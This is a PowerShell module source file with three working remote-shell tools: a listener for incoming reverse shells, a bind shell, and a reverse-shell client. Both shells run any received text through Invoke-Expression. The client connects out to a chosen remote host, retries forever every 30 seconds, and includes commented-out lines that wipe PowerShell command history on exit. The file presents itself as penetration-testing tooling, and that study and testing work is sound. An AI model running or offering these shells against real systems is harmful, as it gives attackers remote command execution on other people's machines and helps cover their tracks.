<#
.NAME
    Start-Listener


.SYNOPSIS
    This cmdlet is for starting a listener that a reverse shell can attach too.


.DESCRIPTION
    The Start-Listener cmdlet opens a listner port to connect to from a target machine.


.SYNTAX
    Start-Listener [[-Port] <int32>]


.PARAMETERS
    -Port [<Int32>]
        This parameter is for defining the listening port to connect too. 
        The cmdlet binds connections to the port that you specify.
            Required?                    false
            Position?                    0
            Default value                1337
            Accept pipeline input?       false
            Accept wildcard characters?  false

    <CommonParameters>
        This cmdlet supports the common parameters: Verbose, Debug,
        ErrorAction, ErrorVariable, WarningAction, WarningVariable,
        OutBuffer, PipelineVariable, and OutVariable. For more information, see
        about_CommonParameters (https:/go.microsoft.com/fwlink/?LinkID=113216).

.EXAMPLE
    -------------------------- EXAMPLE 1 --------------------------
    Start-Listener -Port 1234
    This examples connects to a listener on port 1234.

    -------------------------- EXAMPLE 2 --------------------------
    Start-Listener
    This examples connects to a listener on port 1337.


.NOTES
    Author: Rob Osborne
    ALias: tobor
    Contact: rosborne@osbornepro.com
    https://roberthsoborne.com


.INPUTS
    None


.OUTPUTS
    None

#>
Function Start-Listener {
    [CmdletBinding()]
        param(
            [Parameter(
                Mandatory=$False,
                Position=0,
                ValueFromPipeline=$False,
                HelpMessage='Enter a port to listen on. Valid ports are between 1 and 65535. Example: 1234')] # End Parameter
            [ValidateRange(1,65535)]
            [int32]$Port = 1337
        ) # End param

    Write-Verbose "Defining listener object"
    $Socket = New-Object -TypeName System.Net.Sockets.TcpListener('0.0.0.0', $Port);

    If($Null -eq $Socket)
    {

        Exit

    } # End If

    $PortString = $Port.ToString()

    Write-Verbose "Starting listener on port $PortString and creating job to allow closing the connection"
    
    $Socket.Start()
    Write-Host ("Listening on [0.0.0.0] (port " + $Port + ")") -ForegroundColor 'Green'
    While ($true) 
    {

        Write-Verbose "Begin loop allowing Ctrl+C to stop the listener"
        If ($Socket.Pending()) 
        {
        
            $Client = $Socket.AcceptTcpClient()

            Break;

        }  # End If

        Start-Sleep -Seconds 1

     }  # End While

    Write-Host "[*] Connection Established." -ForegroundColor 'Green'

    Write-Verbose "Creating byte stream"
    $Stream = $Client.GetStream()
    $Writer = New-Object -TypeName System.IO.StreamWriter($Stream)
    $Buffer = New-Object -TypeName System.Byte[] 2048
    $Encoding = New-Object -TypeName System.Text.AsciiEncoding

    Write-Verbose "Begin command execution loop"
    Do 
    {

        $Command = Read-Host

        $Writer.WriteLine($Command)
        $Writer.Flush();

        If($Command -eq "exit")
        {

            Write-Verbose "Exiting"
            Break

        }  # End If

        $Read = $Null

        While($Stream.DataAvailable -or $Null -eq $Read)
        {

            $Read = $Stream.Read($Buffer, 0, 2048)
            $Out = $Encoding.GetString($Buffer, 0, $Read)

            Write-Output $Out

        } # End While

    } While ($Client.Connected -eq $True) # End Do While Loop

    Write-Verbose "Terminating connection"
    $Socket.Stop()
    $Client.Close()
    $Stream.Dispose()
    Write-Verbose "Connection closed"

} # End Function Start-Listener


<#
.NAME
    Start-Bind


.SYNOPSIS
    This cmdlet is for binding the PowerShell application to a listening port.


.DESCRIPTION
    Start-Bind cmdlet opens a Bind Shell that attaches to PowerShell and listens on a port that you define.


.SYNTAX
    Start-Bind [[-Port] <int32>]


.PARAMETERS
    -Port [<Int32>]
        This parameter is for defining the listening port that PowerShell should attach too
        The cmdlet binds powershell to the port that you specify.
            Required?                    false
            Position?                    0
            Default value                1337
            Accept pipeline input?       false
            Accept wildcard characters?  false

    <CommonParameters>
        This cmdlet supports the common parameters: Verbose, Debug,
        ErrorAction, ErrorVariable, WarningAction, WarningVariable,
        OutBuffer, PipelineVariable, and OutVariable. For more information, see
        about_CommonParameters (https:/go.microsoft.com/fwlink/?LinkID=113216).


.EXAMPLE
    -------------------------- EXAMPLE 1 --------------------------
    Start-Bind -Port 1234
    This examples connects powershell.exe to a listener on port 1234.

    -------------------------- EXAMPLE 2 --------------------------
    Start-Bind
    This examples connects powershell.exe to a listener on port 1337.


.NOTES
    Author: Rob Osborne
    ALias: tobor
    Contact: rosborne@osbornepro.com
    https://roberthsoborne.com


.INPUTS
    None


.OUTPUTS
    None

#>
Function Start-Bind {
    [CmdletBinding()]
        param(
            [Parameter(
                Mandatory=$False,
                Position=1,
                ValueFromPipeline=$False,
                HelpMessage='Enter a port to listen on. Valid ports are between 1 and 65535. Example: 1234')] # End Parameter
            [ValidateRange(1,65535)]
            [int32]$Port = 1337
        )  # End param

        $PortString = $Port.ToString()
        Write-Verbose "Creating listener on port $PortString" 
        $Listener = [System.Net.Sockets.TcpListener]$Port
        Write-Host "[*] PowerShell.exe is bound to port $PortString" -ForegroundColor "Green"
        $Listener.Start()

        While ($True) 
        {
            
            Write-Verbose "Begin loop allowing Ctrl+C to stop the listener"
            If ($Listener.Pending()) 
            {
            
                $Client = $Listener.AcceptTcpClient()
    
                Break;
    
            }  # End If
    
            Start-Sleep -Seconds 1
    
         }  # End While
    
        Write-Host "[*] Connection Established." -ForegroundColor 'Green'
        $Stream = $Client.GetStream()

        Write-Verbose "Streaming bytes to PowerShell connection"
       [byte[]]$Bytes = 0..65535 | ForEach-Object -Process { 0 }
       $SendBytes = ([text.encoding]::ASCII).GetBytes("Logged into PowerShell as " + $env:USERNAME + " on " + $env:COMPUTERNAME + "`n`n")

       $Stream.Write($SendBytes,0,$SendBytes.Length)
       $SendBytes = ([text.encoding]::ASCII).GetBytes('PS ' + (Get-Location).Path + '>')
       $Stream.Write($SendBytes,0,$SendBytes.Length)

        Write-Verbose "Begin command execution cycle"
       While(($i = $Stream.Read($Bytes, 0, $Bytes.Length)) -ne 0)
       {
           
            $EncodedText = New-Object -TypeName System.Text.ASCIIEncoding
            $Data = $EncodedText.GetString($Bytes, 0, $i)

            Try
            {

                $SendBack = (Invoke-Expression -Command $Data 2>&1 | Out-String)

            }  # End Try
            Catch
            {

                Write-Host "Failure occured attempting to execute the command on target." -ForegroundColor 'Red'

                $Error[0] | Out-String 

            }  # End Catch

            Write-Verbose "Initial data send failed. Attempting a second time"
            $SendBack2  = $SendBack + 'PS ' + (Get-Location | Select-Object -ExpandProperty 'Path') + '> '
            $x = ($Error[0] | Out-String)
            $Error.clear()
            $SendBack2 = $SendBack2 + $x

            $SendByte = ([text.encoding]::ASCII).GetBytes($SendBack2)
            $Stream.Write($SendByte, 0, $SendByte.Length)
            $Stream.Flush()

        }  # End While

        Write-Verbose "Terminating connection"
        $Client.Close()
        $Listener.Stop()
        Write-Verbose "Connection closed"

}  # End Function Start-Bind

<#
.NAME
    Invoke-ReversePowerShell


.SYNOPSIS
    This cmdlet is for connecting PowerShell to a listening port on a target machine.
    This function is NOT able to connect to the Start-Bind cmdlet in this module.


.DESCRIPTION
    Connect to a lsitening port on a remote machine to complete a reverse shell.


.SYNTAX
    Invoke-ReversePowerShell [-IpAddress] <string> [[-Port] <int32>]


.PARAMETERS
    -IpAddress [<String>]
        This parameter is for defining the IPv4 address to connect too on a remote machine
        The cmdlet looks for a connection at this IP address on the remote host.
            Required?                    false
            Position?                    0
            Default value                none
            Accept pipeline input?       false
            Accept wildcard characters?  false

    -Port [<Int32>]
        This parameter is for defining the listening port to attach too on a remote machine
        The cmdlet looks for a connection on a remote host using the port that you specify here.
            Required?                    false
            Position?                    1
            Default value                1337
            Accept pipeline input?       false
            Accept wildcard characters?  false

    <CommonParameters>
        This cmdlet supports the common parameters: Verbose, Debug,
        ErrorAction, ErrorVariable, WarningAction, WarningVariable,
        OutBuffer, PipelineVariable, and OutVariable. For more information, see
        about_CommonParameters (https:/go.microsoft.com/fwlink/?LinkID=113216).


.EXAMPLE
    -------------------------- EXAMPLE 1 --------------------------
    Invoke-ReversePowerShell -IpAddress 192.168.2.1 -Port 1234
    This examples connects to port 1234 on remote machine 192.168.2.1

    -------------------------- EXAMPLE 2 --------------------------
    Invoke-ReversePowerShell 192.168.2.1 1337
    This examples connects to port 1337 on remote machine 192.168.2.1.


.NOTES
    Author: Rob Osborne
    ALias: tobor
    Contact: rosborne@osbornepro.com
    https://roberthsoborne.com


.INPUTS
    None


.OUTPUTS
    None

#>
Function Invoke-ReversePowerShell {
    [CmdletBinding()]
        param(
            [Parameter(
                Mandatory=$True,
                Position=0,
                ValueFromPipeline=$True,
                ValueFromPipelineByPropertyName=$True,
                HelpMessage="Enter the IP Address of the remote machine. Example: 10.10.14.21")] # End Parameter
            [ValidateNotNullorEmpty()]
            [IPAddress]$IpAddress,

            [Parameter(
                Mandatory=$False,
                Position=1,
                ValueFromPipeline=$False,
                HelpMessage="Enter the port number the remote machine is listening on. Example: 1234")] # End Parameter
            [ValidateNotNullorEmpty()]
            [ValidateRange(1,65535)]
            [int32]$Port = 1337
        ) # End param

    Write-Verbose "Creating a fun infinite loop. - The Shadow King (Amahl Farouk)"
    $GodsMakeRules = "They dont follow them"

    While ($GodsMakeRules -eq 'They dont follow them')
    {

        Write-Verbose "Default error action is being defined as Continue"
        $ErrorActionPreference = 'Continue'

        Try
        {

            Write-Host "Connection attempted. Check your listener." -ForegroundColor 'Green'

            $Client = New-Object System.Net.Sockets.TCPClient($IpAddress,$Port)
            $Stream = $Client.GetStream()

            [byte[]]$Bytes = 0..255 | ForEach-Object -Process {0}
            $SendBytes = ([Text.Encoding]::ASCII).GetBytes("Welcome $env:USERNAME, you are now connected to $env:COMPUTERNAME "+"`n`n" + "PS " + (Get-Location).Path + "> ")
            $Stream.Write($SendBytes,0,$SendBytes.Length);$Stream.Flush()

            While(($i = $Stream.Read($Bytes, 0, $Bytes.Length)) -ne 0)
            {

                $Command = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($Bytes,0, $i)

                If($Command.StartsWith("kill-link"))
                {

                    Clear-Host

                    Write-Information "[*] If you wish to clear your command history when exiting shell uncomment the below lines"
                    # Clear-History
                    # Clear-Content -Path ((Get-PSReadlineOption).HistorySavePath) -Force
                    Write-Verbose "Closing client connection"
                    $Client.Close()
                    Write-Verbose "Client connection closed"
                    Exit

                } # End If
                Try
                {

                    # Executes commands
                    $ExecuteCmd = Invoke-Expression -Command $Command -ErrorAction SilentlyContinue | Out-String
                    $ExecuteCmdAgain  = $ExecuteCmd + "PS " + (Get-Location).Path + "> "

                } # End Try
                Catch
                {

                    $Error[0].ToString() + $Error[0].InvocationInfo.PositionMessage
                    $ExecuteCmdAgain  =  "ERROR: " + $Error[0].ToString() + "`n`n" + "PS " + (Get-Location).Path + "> "
                    Clear-Host

                } # End Catch
                
                $ReturnBytes = ([Text.Encoding]::ASCII).GetBytes($ExecuteCmdAgain)
                $Stream.Write($ReturnBytes,0,$ReturnBytes.Length)
                $Stream.Flush()

            } # End While

        } # End Try
        Catch
        {

            Write-Host "There was a connection error. Retrying occurs every 30 seconds" -ForegroundColor 'Red'
            If ($Client.Connected)
            {

                Write-Information "[*] If you wish to clear your command history when exiting shell uncomment the below lines"
                # Clear-History
                # Clear-Content -Path ((Get-PSReadlineOption).HistorySavePath) -Force

                Write-Verbose "Client closing"
                $Client.Close()
                Write-Verbose "Client connection closed"

            } # End If

            Write-Information "[*] If you wish to clear your command history when exiting shell uncomment the below lines"
            # Clear-History
            # Clear-Content -Path ((Get-PSReadlineOption).HistorySavePath) -Force

            Write-Verbose "Begining countdown timer to reestablish failed connection"
            [int]$Time = 30
            $Length = $Time / 100

            For ($Time; $Time -gt 0; $Time--) 
            {
            
                $Text = "0:" + ($Time % 60) + " seconds left"
                Write-Progress -Activity "Attempting to re-establish connection in: " -Status $Text -PercentComplete ($Time / $Length)
                Start-Sleep -Seconds 1
            
            }  # End For

        } # End Catch

    } # End While

} # End Function Invoke-ReversePowerShell
